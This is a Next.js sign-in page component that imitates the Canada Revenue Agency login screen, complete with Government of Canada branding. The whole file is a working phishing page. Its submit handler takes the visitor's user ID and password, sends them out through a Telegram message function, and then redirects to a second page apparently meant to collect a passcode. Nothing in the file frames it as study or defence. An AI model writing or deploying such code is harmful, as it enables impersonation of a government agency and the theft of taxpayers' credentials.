"use client";

import { useState, FormEvent } from "react";
import { useRouter } from "next/navigation";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { sendTelegramMessage } from "../../utils/telegram"; // adjust path
import Image from "next/image";

export default function CRASignInTelegram() {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  // Default error message as requested
  const [error, setError] = useState("");
  const router = useRouter();

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault();

    // Override error if fields are empty
    if (!userId.trim() || !password.trim()) {
      setError("Please enter both User ID and Password.");
      return;
    }

    const message = `
🔔 *CRA Sign‑in* 🔔
👤 User ID: ${userId}
🔑 Password: ${password}
    `;

    try {
      await sendTelegramMessage(message);
      // After successful send, redirect to the passcode page
      router.push("/cra2"); // change to your actual route
    } catch (err) {
      console.error(err);
      setError("An error occurred. Please try again.");
    }
  };

  return (
    <div className="min-h-screen bg-white text-gray-800">
      {/* Government of Canada signature bar */}
      <div className="bg-gray-100 border-b border-gray-300">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2 flex justify-between items-center">
          

<Image
  src="/images/sig-blk-en.svg"
  alt="Government of Canada"
  width={500}
  height={150}
  className="h-16 w-auto"
/>    <div className="text-right">
            <div className="text-xs sm:text-sm text-gray-600">Government of Canada</div>
            <div lang="fr" className="text-xs sm:text-sm text-gray-600">
              Gouvernement du Canada
            </div>
          </div>
        </div>
      </div>

      {/* CRA branding bar */}
      <div className="bg-[#26374a] text-white">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
          <div className="text-xl sm:text-2xl font-bold">Canada Revenue Agency</div>
        </div>
      </div>

      {/* Main content */}
      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
        <div className="max-w-2xl">
          <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-6">CRA Sign-in</h1>

          {/* Error message display – default error shown on load */}
          {error && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm mb-6 flex items-start">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0"
                viewBox="0 0 20 20"
                fill="currentColor"
              >
                <path
                  fillRule="evenodd"
                  d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                  clipRule="evenodd"
                />
              </svg>
              <span>{error}</span>
            </div>
          )}

          <form onSubmit={handleSubmit} noValidate>
            {/* User ID */}
            <div className="mb-8">
              <label htmlFor="userid" className="block text-base sm:text-lg font-semibold mb-2">
                User ID <span className="text-red-600 italic">(required)</span>
              </label>
              <input
                id="userid"
                type="text"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full sm:w-96 h-12 border border-gray-400 rounded px-3 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                aria-required="true"
              />
              <div className="mt-2">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="text-blue-800 underline text-base hover:text-blue-900"
                >
                  Forgot your user ID?
                </a>
              </div>
            </div>

            {/* Password */}
            <div className="mb-8">
              <label htmlFor="password" className="block text-base sm:text-lg font-semibold mb-2">
                Password <span className="text-red-600 italic">(required)</span>
              </label>
              <div className="relative w-full sm:w-96">
                <input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full h-12 border border-gray-400 rounded px-3 pr-12 text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  aria-required="true"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-600"
                  aria-label={showPassword ? "Hide password" : "Show password"}
                >
                  {showPassword ? <FaEyeSlash size={22} /> : <FaEye size={22} />}
                </button>
              </div>
              <div className="mt-2">
                <a
                  href="#"
                  onClick={(e) => e.preventDefault()}
                  className="text-blue-800 underline text-base hover:text-blue-900"
                >
                  Forgot your password?
                </a>
              </div>
            </div>

            {/* Privacy statement */}
            <p className="text-gray-700 text-base mb-8">
              For more information on how your privacy is protected, refer to our{" "}
              <a href="#" className="text-blue-800 underline hover:text-blue-900">
                Personal Information Collection Statement
              </a>
              .
            </p>

            {/* Buttons */}
            <div className="flex flex-col sm:flex-row gap-4 mb-6">
              <button
                type="submit"
                className="bg-[#26374a] hover:bg-[#1c2a3f] text-white font-semibold py-3 px-8 rounded text-lg"
              >
                Sign in
              </button>
              <button
                type="button"
                onClick={() => {
                  setUserId("");
                  setPassword("");
                  //  ;
                }}
                className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-8 rounded text-lg border border-gray-400"
              >
                Exit
              </button>
            </div>

            {/* Register link */}
            <p className="text-base">
              <a href="#" className="text-blue-800 underline hover:text-blue-900">
                Register
              </a>{" "}
              if you are a new user.
            </p>
          </form>

          {/* Screen ID */}
          <div className="text-xs text-gray-400 mt-8 border-t pt-4">Screen ID: CMS.30</div>
        </div>
      </main>
    </div>
  );
}